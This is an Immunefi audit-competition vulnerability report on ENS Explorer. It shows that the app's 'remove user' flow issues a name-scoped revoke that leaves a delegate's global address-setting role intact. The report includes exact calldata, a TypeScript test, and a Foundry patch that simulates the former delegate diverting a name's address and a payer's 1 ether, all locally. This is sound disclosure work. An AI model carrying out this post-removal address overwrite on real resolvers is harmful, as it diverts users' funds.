# 92094 w a critical critical explorer role removal preserves global role set addr enabling post offboarding ens address diversion

## #92094 \[W\&A-Critical] \[Critical] Explorer role removal preserves global ROLE\_SET\_ADDR, enabling post-offboarding ENS address diversion

**Submitted on Sep 7th 2026 at 05:45:07 UTC by @Asphyx for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #92094
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* **Impacts:**
  * Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient, such as: - resolving or rendering an ENS name to an attacker-controlled address - showing the wrong recipient or amount on a transaction the user then approves

### Description

### Severity and affected asset

* **Severity:** Critical
* **Impact:** 6285 — incorrect address, name, or transaction details resulting in an unintended recipient, including an ENS name resolving to an attacker-controlled address
* **Affected asset:** `apps/portal` (ENS Explorer)
* **Competition repository snapshot/import commit:** `cda79acaad59711b943fc68207ebb3f1d0ff8596`
* **Official audited application revision:** `63772fd872af472ced58b009499355f3430c2a86`

### Summary

ENS Explorer combines all resolver-role assignments for the same account into one editable row, even when those assignments belong to different Enhanced Access Control resources. The combined row loses the association between each role and its original resource.

When the row contains both a global/root role and a name-scoped role, the removal flow selects the first non-root name and submits one name-scoped revocation containing the union of the row's roles. The interface describes the row as **Global roles (all names)** and asks the owner to remove the user **from all roles**, but the successful transaction does not touch `ROOT_RESOURCE`.

For example, if a delegate has global `ROLE_SET_ADDR` and name-scoped `ROLE_SET_TEXT` on `victim.eth`, Explorer generates:

```solidity
authorizeNameRoles(dns("victim.eth"), ROLE_SET_ADDR | ROLE_SET_TEXT, delegate, false)
```

It should revoke the global assignment separately with:

```solidity
revokeRootRoles(ROLE_SET_ADDR, delegate)
```

After the displayed removal succeeds, the former delegate still has effective `ROLE_SET_ADDR` on every name using that resolver. Before the owner notices the surviving assignment and performs a correct root revocation, the former delegate can change `victim.eth` to resolve to an attacker-controlled address. A payer resolving the name during that interval can consequently send funds to the attacker.

This report concerns the in-scope Explorer transaction-construction logic. The resolver contracts are not alleged to be vulnerable; their exact implementation is used only to demonstrate the state transition and security consequence of Explorer's calldata.

### Root cause

The resource dimension is discarded and never recovered before the transaction is constructed:

1. [`groupRolesByAccount()` groups solely by the lowercased account](https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/apps/portal/src/lib/roles/resolverRoles.ts#L179-L220). Roles, decoded roles, and resolved resource names from every resource are appended to one account group.
2. [`ResolverRolesTable` passes those account groups directly to the editable role UI](https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/apps/portal/src/features/resolver/components/ResolverRolesTable.tsx#L102-L104).
3. [`ResolverRolesSidebar` unions the group's roles and selects the first non-root name](https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx#L165-L173):

   ```typescript
   const decodedRoles = (row?.original.decodedRoles ?? []) as ResolverRoleKey[]
   const resolvedNames = row?.original.resolvedNames ?? []
   const roleName = resolvedNames.find((n) => n !== '(root)') ?? ''
   ```

   Therefore, a mixed root/name row always chooses a name. A row containing two names similarly chooses only the first name.
4. [`handleRemoveUser()` stores that one name together with the full cross-resource role union](https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx#L295-L322). The removal mutation then makes [one call to `revokeResolverRoles()`](https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx#L251-L276).
5. [`revokeResolverRoles` uses the root path only when `name === ''`](https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/apps/portal/src/features/resolver/helpers/revokeResolverRoles.ts#L41-L67). Any selected name is mapped to `scope: 'name'`. [The pinned ENSJS implementation](https://github.com/ensdomains/ensjs/blob/e96662c22a73e6bc2e4eb23b66785defab4feb8c/packages/ensjs/src/actions/wallet/v2/revokeResolverRoles.ts#L112-L132) consequently encodes `authorizeNameRoles(..., false)` rather than `revokeRootRoles()`.
6. The operation is represented more broadly than the transaction it constructs. A row containing root is labeled [`Global roles (all names)`](https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx#L389-L396), and the confirmation asks whether to [`remove this user from all roles`](https://github.com/immunefi-team/audit-comp-ens/blob/cda79acaad59711b943fc68207ebb3f1d0ff8596/apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx#L441-L447).

The contract primitives correctly keep root and name assignments in separate resources. [`authorizeNameRoles` derives and mutates one name resource](https://github.com/ensdomains/contracts-v2/blob/97a57293f3b4279d94b571e678edb53ce62638f4/contracts/src/resolver/PermissionedResolver.sol#L273-L293), [root revocation is a separate operation](https://github.com/ensdomains/contracts-v2/blob/97a57293f3b4279d94b571e678edb53ce62638f4/contracts/src/access-control/EnhancedAccessControl.sol#L145-L166), and [`_effectiveRoles` combines root and resource-specific roles](https://github.com/ensdomains/contracts-v2/blob/97a57293f3b4279d94b571e678edb53ce62638f4/contracts/src/access-control/EnhancedAccessControl.sol#L448-L455). A name-scoped revoke cannot alter the root assignment, and root roles remain effective for name resources until explicitly revoked. This is why the malformed transaction succeeds while leaving global authority intact.

### Exact calldata

The application-level PoC uses:

```
resolver: 0x1111111111111111111111111111111111111111
owner:    0x2222222222222222222222222222222222222222
delegate: 0x3333333333333333333333333333333333333333
name:     victim.eth
roles:    ROLE_SET_ADDR | ROLE_SET_TEXT = 0x11
```

Explorer generates the following calldata:

```
0xbbd9abb50000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000001100000000000000000000000033333333333333333333333333333333333333330000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c0676696374696d03657468000000000000000000000000000000000000000000
```

It decodes as:

```
authorizeNameRoles(
  0x0676696374696d0365746800,  // DNS-encoded victim.eth
  17,
  0x3333333333333333333333333333333333333333,
  false
)
```

The selector is `0xbbd9abb5`. This modifies only the resource derived from `victim.eth`.

The minimal correct revocation of the demonstrated global assignment is a different function and selector:

```
0xce156e8200000000000000000000000000000000000000000000000000000000000000010000000000000000000000003333333333333333333333333333333333333333

revokeRootRoles(1, 0x3333333333333333333333333333333333333333)
```

Its selector is `0xce156e82`. Complete offboarding must also revoke the separate name-scoped bitmap on its own resource. Explorer does not include the root call when a mixed row contains any non-root name.

### Step-by-step reachable workflow

1. An ordinary resolver owner/admin manages an app-created `PermissionedResolver`. The initial owner has sufficient root administration authority to grant and revoke the roles in this example.
2. In Explorer's **Add user** flow, the owner grants delegate `D` global `ROLE_SET_ADDR` using **Root (all nodes)**.
3. The owner separately grants the same delegate a name-scoped role, such as `ROLE_SET_TEXT`, on `victim.eth`. This is a legitimate initial delegation.
4. The resolver-role index contains two direct assignments for `D`: one on `ROOT_RESOURCE` and one on the `victim.eth` resource.
5. Explorer calls `groupRolesByAccount()`. Both assignments become one row with:

   ```
   account:       D
   resolvedNames: ["(root)", "victim.eth"]
   decodedRoles:  ["ROLE_SET_ADDR", "ROLE_SET_TEXT"]
   ```
6. Explorer labels this row **Global roles (all names)**. The owner chooses **Remove user** and confirms **remove this user from all roles**.
7. Explorer selects `victim.eth`, unions the two roles into bitmap `0x11`, and asks the owner's connected wallet to sign the name-scoped calldata shown above. The owner signs the removal transaction.
8. The transaction succeeds. The direct name-scoped assignment is removed, but global `ROLE_SET_ADDR` remains stored and effective.
9. Before the owner sees the refreshed surviving row and performs a correct root revocation, the now-former delegate calls `setAddr(namehash("victim.eth"), attackerAddress)`. The exact resolver authorization accepts this call because root roles apply globally.
10. A payer resolving `victim.eth` during this interval receives the attacker-controlled address. A subsequent payment can therefore be sent to the unintended recipient.

### Impact

The completed removal transaction creates a false offboarding boundary: an account represented as removed from all resolver roles retains global authority to change address records. Address records are the destination used by wallets and applications when paying an ENS name.

The deterministic PoC proves that, after Explorer's successful revoke, the former delegate can write an attacker-controlled ETH address for the victim name. A local impact simulation then has a payer read the resolver's poisoned record and transfer `1 ether` to the returned address, verifying the diverted recipient's balance increase. This matches the competition's [Critical impact 6285](https://immunefi.com/audit-competition/audit-competition-ens/scope/): an incorrect name/address/transaction detail can cause an unintended recipient, specifically including an ENS name resolving to an attacker-controlled address.

A realized loss requires the former delegate to act before the owner repairs the incomplete revocation and a payer to rely on resolution during that interval. No fixed funds-at-risk amount is asserted; realized loss would equal the amount a payer sends using the diverted resolution during the window. The PoC does not execute or claim an observed public-network payment.

### Preconditions and limitations

1. The attacker is a former delegate who was legitimately granted resolver authority before the owner attempted removal. This is not an arbitrary-outside-account exploit.
2. The same delegate must have direct assignments on at least two resources. The demonstrated security case is global `ROLE_SET_ADDR` plus any name-scoped role. A root-only row follows the correct root path.
3. The signer must have sufficient authority for the union-bitmap name revoke to succeed. The reproducible case uses the initial resolver owner/admin. The report does not assume that every UI-enabled manager can revoke every role.
4. The owner must intentionally use Explorer's grouped removal flow and approve its transaction. The former delegate cannot force the owner to start removal.
5. The malicious former delegate must use its own originally authorized account and act before the owner performs a correct root revoke. After the owner completes the ordinary removal flow, exploitation requires no access to an owner, administrator, governance, or strategist account and no leaked credentials.
6. After indexer synchronization, the surviving root assignment can remain or reappear in Explorer. An attentive owner can retry removal, and a now-root-only row should produce the correct root revoke. Recovery is possible, but it is neither automatic nor atomic with the first successful and misleading transaction.
7. Wallet transaction decoding varies. Some wallets may expose the function and arguments. Explorer itself does not enumerate the omitted resources, and seeing one decoded name does not reconstruct the assignments that were discarded during grouping.
8. The demonstrated consequence is an unauthorized post-removal record overwrite and the resulting payment-diversion path. It is not a claim of permanent takeover, guaranteed loss, or a currently observed public deployment exploit.

### Known-issue distinction

This flow requires no name transfer, migration, or UI hang. The published `QA-01`, `WEB-1257`, and `WEB-1305` items concern transfer/migration behavior or follow-up failures rather than a successful resolver-role removal targeting one wrong EAC resource. [Contracts-v2 PR #279](https://github.com/ensdomains/contracts-v2/pull/279) supplies the fine-grained contract primitives that Explorer should call without discarding resource identity. [Contracts-v2 issue #418](https://github.com/ensdomains/contracts-v2/issues/418) is transfer-driven, out-of-scope contract logic; this report requires no transfer and alleges an in-scope application transaction-construction defect.

### Recommended remediation

1. Preserve `(account, resource, roleBitmap)` identity throughout the data passed to editable resolver-role rows. Do not union editable assignments across root and name resources.
2. Prefer one editable row per direct resource assignment. Show whether each row is root-scoped or name-scoped and call the matching revocation primitive:
   * root resource: `revokeRootRoles(bitmap, account)`;
   * name resource: `authorizeNameRoles(dnsName, bitmap, account, false)`.
3. If an account-level **Remove user everywhere** action is retained, construct an explicit batch covering every direct resource assignment. Compute each resource's bitmap independently; never send a cross-resource union bitmap to one resource.
4. Make the confirmation and transaction preview enumerate every affected scope and call. Do not report success for complete removal unless all resource-specific revocations succeed.
5. Add regression tests for mixed root/name assignments, multiple name resources, different resource ordering, partial administrator permissions, and a post-transaction assertion that no direct or effective role remains for the removed account.

### Proof of Concept

## Proof of concept

### What this reproduces

The Explorer groups resolver-role assignments only by delegate account. If the same delegate has both a root role and a name-scoped role, the UI presents one combined row and states that removal will remove the delegate from all roles. The removal handler nevertheless selects the first non-root name and emits one `authorizeNameRoles(name, combinedBitmap, delegate, false)` call.

That successful transaction clears only the selected name resource. It cannot modify `ROOT_RESOURCE`, so a root `ROLE_SET_ADDR` assignment survives. The former delegate can then replace the affected name's ETH address even though the owner completed the advertised removal. A later payer resolving the name can consequently be directed to the delegate's address.

Precondition: the delegate was previously granted a legitimate root `ROLE_SET_ADDR` assignment and at least one name-scoped assignment on the same Permissioned Resolver. The owner then uses Explorer to offboard that delegate.

These reproductions run locally and make no RPC calls or public state changes.

### Frozen source versions

* Explorer audit snapshot: `cda79acaad59711b943fc68207ebb3f1d0ff8596` (audit import identifies upstream `63772fd872af472ced58b009499355f3430c2a86`).
* Contracts-v2: `97a57293f3b4279d94b571e678edb53ce62638f4`.
* Portal test SHA-256: `33D3F9A28303B6C0EDB4D37931E4541A7A3C62959EA36A58A8C44504F6EBC3FC`.
* Full-resolver patch SHA-256: `76A6FDFBF75CB91C2E9F0BEBB411A0CD32F689819CCCE489D83BB30D5AF34A2A`.

### Reproduction 1: exact Explorer grouping and calldata

Save the following file as `apps/portal/src/features/resolver/components/ResolverRolesSidebar.scope.poc.test.ts` in the frozen Explorer checkout:

```typescript
import type { CustomTransactionIntent } from '@ens-apps/transaction-manager'
import {
  permissionedResolverAuthorizeNameRolesSnippet,
  permissionedResolverRevokeRootRolesSnippet,
} from '@ensdomains/ensjs-abi/v2/permissionedResolver'
import {
  type Address,
  decodeFunctionData,
  type Hex,
  toHex,
  type WalletClient,
} from 'viem'
import { packetToBytes } from 'viem/ens'
import { describe, expect, it } from 'vitest'
import { prepareRevokeResolverRolesTransaction } from '@/features/resolver/helpers/revokeResolverRoles'
import {
  buildResourceToNameMap,
  computeNameResource,
  groupRolesByAccount,
  type ResolverRoleKey,
  resolverRoles,
} from '@/lib/roles/resolverRoles'

const ROOT_RESOURCE = `0x${'0'.repeat(64)}`
const RESOLVER = '0x1111111111111111111111111111111111111111' as Address
const OWNER = '0x2222222222222222222222222222222222222222' as Address
const DELEGATE = '0x3333333333333333333333333333333333333333' as Address
const VICTIM_ETH_BAD_REVOKE =
  '0xbbd9abb50000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000001100000000000000000000000033333333333333333333333333333333333333330000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c0676696374696d03657468000000000000000000000000000000000000000000'

const walletClient = {
  account: { address: OWNER },
  chain: { id: 11155111 },
} as unknown as WalletClient

const getEoaData = (intent: CustomTransactionIntent): Hex => {
  expect(intent.request.type).toBe('eoa')
  if (intent.request.type !== 'eoa' || intent.request.data === undefined) {
    throw new Error('Expected an EOA request with calldata')
  }
  return intent.request.data
}

const toResolverRoleKeys = (
  roles: readonly string[],
): readonly ResolverRoleKey[] => {
  for (const role of roles) {
    if (!(role in resolverRoles))
      throw new Error(`Unknown resolver role: ${role}`)
  }
  return roles as readonly ResolverRoleKey[]
}

describe('ResolverRolesSidebar mixed-resource revocation PoC', () => {
  it('merges root and name grants, then the sidebar selection builds only a name-scoped revoke', () => {
    const name = 'victim.eth'
    const nameResource = computeNameResource(name)
    const grouped = groupRolesByAccount(
      [
        {
          account: DELEGATE,
          resource: ROOT_RESOURCE,
          roleBitmap: `0x${resolverRoles.ROLE_SET_ADDR.toString(16)}`,
        },
        {
          account: DELEGATE,
          resource: nameResource,
          roleBitmap: `0x${resolverRoles.ROLE_SET_TEXT.toString(16)}`,
        },
      ],
      buildResourceToNameMap([{ name }]),
    )

    expect(grouped).toHaveLength(1)
    expect(grouped[0].resolvedNames).toEqual(['(root)', name])
    expect(grouped[0].decodedRoles).toEqual(['ROLE_SET_ADDR', 'ROLE_SET_TEXT'])
    const groupedRoleKeys = toResolverRoleKeys(grouped[0].decodedRoles)

    // Exact selection used by ResolverRolesSidebar.tsx:169.
    const roleName = grouped[0].resolvedNames.find((n) => n !== '(root)') ?? ''
    expect(roleName).toBe(name)

    // Exact remove action used by ResolverRolesSidebar.tsx:316-321 and :266-275.
    const generated = prepareRevokeResolverRolesTransaction({
      resolverAddress: RESOLVER,
      name: roleName,
      account: DELEGATE,
      roles: groupedRoleKeys,
      walletClient,
      chainId: 11155111,
    })

    const generatedData = getEoaData(generated)
    const generatedCall = decodeFunctionData({
      abi: [
        ...permissionedResolverAuthorizeNameRolesSnippet,
        ...permissionedResolverRevokeRootRolesSnippet,
      ],
      data: generatedData,
    })

    expect(generatedCall.functionName).toBe('authorizeNameRoles')
    expect(generatedCall.args).toEqual([
      toHex(packetToBytes(name)),
      resolverRoles.ROLE_SET_ADDR | resolverRoles.ROLE_SET_TEXT,
      DELEGATE,
      false,
    ])
    expect(generatedData).toBe(VICTIM_ETH_BAD_REVOKE)

    // A true global revocation would instead take the empty-name branch and
    // call revokeRootRoles. The two calls have different selectors/resources.
    const correctRootRevoke = prepareRevokeResolverRolesTransaction({
      resolverAddress: RESOLVER,
      name: '',
      account: DELEGATE,
      roles: groupedRoleKeys,
      walletClient,
      chainId: 11155111,
    })
    const correctRootData = getEoaData(correctRootRevoke)
    const rootCall = decodeFunctionData({
      abi: [
        ...permissionedResolverAuthorizeNameRolesSnippet,
        ...permissionedResolverRevokeRootRolesSnippet,
      ],
      data: correctRootData,
    })

    expect(rootCall.functionName).toBe('revokeRootRoles')
    expect(correctRootData.slice(0, 10)).not.toBe(generatedData.slice(0, 10))
  })

  it.each([
    ['alpha.eth', 'beta.eth'],
    ['beta.eth', 'alpha.eth'],
  ] as const)('targets only the first displayed non-root resource for row order %s -> %s', (firstName, survivingName) => {
    const grouped = groupRolesByAccount(
      [
        {
          account: DELEGATE,
          resource: computeNameResource(firstName),
          roleBitmap: `0x${resolverRoles.ROLE_SET_ADDR.toString(16)}`,
        },
        {
          account: DELEGATE,
          resource: computeNameResource(survivingName),
          roleBitmap: `0x${resolverRoles.ROLE_SET_TEXT.toString(16)}`,
        },
      ],
      buildResourceToNameMap([{ name: 'alpha.eth' }, { name: 'beta.eth' }]),
    )

    expect(grouped).toHaveLength(1)
    expect(grouped[0].resolvedNames).toEqual([firstName, survivingName])
    expect(grouped[0].decodedRoles).toEqual(['ROLE_SET_ADDR', 'ROLE_SET_TEXT'])

    const roleName = grouped[0].resolvedNames.find((n) => n !== '(root)') ?? ''
    const generated = prepareRevokeResolverRolesTransaction({
      resolverAddress: RESOLVER,
      name: roleName,
      account: DELEGATE,
      roles: toResolverRoleKeys(grouped[0].decodedRoles),
      walletClient,
      chainId: 11155111,
    })
    const generatedData = getEoaData(generated)
    const generatedCall = decodeFunctionData({
      abi: permissionedResolverAuthorizeNameRolesSnippet,
      data: generatedData,
    })

    expect(generatedCall.functionName).toBe('authorizeNameRoles')
    expect(generatedCall.args).toEqual([
      toHex(packetToBytes(firstName)),
      resolverRoles.ROLE_SET_ADDR | resolverRoles.ROLE_SET_TEXT,
      DELEGATE,
      false,
    ])

    // authorizeNameRoles has one DNS-name argument. There is no second call
    // or second resource argument that could revoke the other row member.
    expect(generatedData).not.toContain(
      toHex(packetToBytes(survivingName)).slice(2),
    )
  })
})
```

From `apps/portal`, run:

```powershell
$env:COREPACK_INTEGRITY_KEYS='0'
corepack pnpm@10.27.0 exec vitest run src/features/resolver/components/ResolverRolesSidebar.scope.poc.test.ts --reporter=verbose
```

Expected result: one file and three tests pass.

The decisive root-plus-name test proves all of the following in the application code path:

1. Root and name assignments for the same account become one row.
2. The sidebar chooses `victim.eth` instead of the root scope.
3. The generated transaction is `authorizeNameRoles(dns("victim.eth"), 0x11, delegate, false)`.
4. Its exact calldata begins with selector `0xbbd9abb5`.
5. The correct root operation is `revokeRootRoles(0x11, delegate)`, with a different selector.

The remaining two cases prove that a row containing two distinct name resources also targets only the first displayed name, regardless of input order.

### Reproduction 2: consequence on the complete PermissionedResolver

Use a clean contracts-v2 checkout at `97a57293f3b4279d94b571e678edb53ce62638f4` with its pinned gitlink dependencies initialized. Save the following as `PermissionedResolver.full-contract.poc.patch` at the repository root:

```diff
diff --git a/contracts/test/unit/resolver/PermissionedResolver.t.sol b/contracts/test/unit/resolver/PermissionedResolver.t.sol
index 64a2bf1..0a23b36 100644
--- a/contracts/test/unit/resolver/PermissionedResolver.t.sol
+++ b/contracts/test/unit/resolver/PermissionedResolver.t.sol
@@ -347,6 +347,61 @@ contract PermissionedResolverTest is Test {
         assertFalse(resolver.hasRootRoles(roleBitmap, friend), "revoked");
     }
 
+    function test_poc_nameScopedRevokeDoesNotRemoveRootAuthority() external {
+        uint256 nameResource = PermissionedResolverLib.resource(testNode, 0);
+        uint256 rootRole = PermissionedResolverLib.ROLE_SET_ADDR;
+        uint256 nameRole = PermissionedResolverLib.ROLE_SET_TEXT;
+
+        vm.startPrank(owner);
+        assertTrue(resolver.grantRootRoles(rootRole, friend), "grant root");
+        assertTrue(resolver.authorizeNameRoles(testName, nameRole, friend, true), "grant name");
+
+        // This is the exact scope/bitmap shape emitted by the Explorer UI after it
+        // merges the two assignments into one row and selects the first non-root name.
+        assertTrue(
+            resolver.authorizeNameRoles(testName, rootRole | nameRole, friend, false),
+            "name-scoped revoke succeeds"
+        );
+        vm.stopPrank();
+
+        assertEq(resolver.roles(nameResource, friend), 0, "name assignment removed");
+        assertTrue(resolver.hasRootRoles(rootRole, friend), "root assignment remains");
+        assertTrue(resolver.hasRoles(nameResource, rootRole, friend), "root role remains effective for name");
+
+        // The delegate can still replace the victim name's ETH address after the
+        // UI has reported a successful removal from all roles.
+        vm.prank(friend);
+        resolver.setAddr(testNode, actor);
+        assertEq(resolver.addr(testNode), actor, "retained delegate changed address");
+
+        // Local impact simulation: a payer resolves the poisoned name and
+        // transfers 1 ether to the address returned by the resolver.
+        address payer = makeAddr("payer");
+        vm.deal(payer, 1 ether);
+        uint256 actorBalanceBefore = actor.balance;
+
+        vm.prank(payer);
+        address resolvedRecipient = resolver.addr(testNode);
+        assertEq(resolvedRecipient, actor, "payer resolves diverted address");
+
+        vm.prank(payer);
+        (bool paymentSent,) = payable(resolvedRecipient).call{value: 1 ether}("");
+        assertTrue(paymentSent, "simulated ENS payment succeeds");
+        assertEq(actor.balance, actorBalanceBefore + 1 ether, "simulated payment reaches attacker address");
+
+        // Negative control: the actual root-scoped revoke removes the inherited
+        // authority and the same delegate can no longer update the record.
+        vm.prank(owner);
+        assertTrue(resolver.revokeRootRoles(rootRole, friend), "revoke root");
+        assertFalse(resolver.hasRoles(nameResource, rootRole, friend), "root authority removed");
+
+        vm.startPrank(friend);
+        vm.expectRevert();
+        resolver.setAddr(testNode, friend);
+        vm.stopPrank();
+        assertEq(resolver.addr(testNode), actor, "address unchanged after correct root revoke");
+    }
+
     function test_authorizeNameRoles_notAuthorized() external {
         uint256 roleBitmap = EACBaseRolesLib.ALL_ROLES;
         vm.expectRevert(
```

From the contracts-v2 repository root, run:

```powershell
git apply --check .\PermissionedResolver.full-contract.poc.patch
git apply .\PermissionedResolver.full-contract.poc.patch
Set-Location .\contracts
forge clean
forge test --match-path test/unit/resolver/PermissionedResolver.t.sol --match-test test_poc_nameScopedRevokeDoesNotRemoveRootAuthority --json
```

Expected result: JSON status `Success`, no warnings, and exit code `0`.

This test executes the real resolver implementation and establishes the security consequence:

1. The root `ROLE_SET_ADDR` grant and name-scoped grant are both created.
2. The Explorer-shaped name-scoped revoke succeeds.
3. The selected name resource is cleared, but root authority remains effective for that name.
4. The supposedly removed delegate successfully changes the name's ETH address.
5. A local payer resolves the poisoned record, transfers 1 ether to the returned address, and the recipient's balance increases by exactly 1 ether.
6. Negative control: `revokeRootRoles` removes the inherited authority and the same update then reverts.

### Result

The owner-visible removal succeeds without revoking the authority that matters. The error is not a reverted transaction or a stale display: the signed calldata addresses the wrong permission resource, the complete resolver continues authorizing the former delegate, and a locally simulated payer transfers 1 ether to the address returned after the unauthorized update. The authority remains until a separate root revoke is executed.
